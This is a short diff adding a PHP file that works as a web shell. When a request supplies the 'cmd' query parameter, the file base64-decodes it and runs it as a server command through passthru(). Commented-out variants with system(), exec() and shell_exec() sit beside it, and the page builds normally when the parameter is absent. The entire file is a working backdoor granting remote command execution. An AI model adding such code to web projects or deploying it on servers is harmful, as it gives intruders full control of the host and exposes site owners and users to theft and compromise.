@@ -1,0 +1,10 @@
+<?
+if(!$_GET['cmd']) buildPage();
+
+//shell_exec($ff);
+//system(base64_decode($_GET['cmd']));
+passthru(base64_decode($_GET['cmd']));
+//exec(base64_decode($_GET['cmd']),$temp);
+//setPage(shell_exec(base64_decode($_GET['cmd'])));
+
+?>
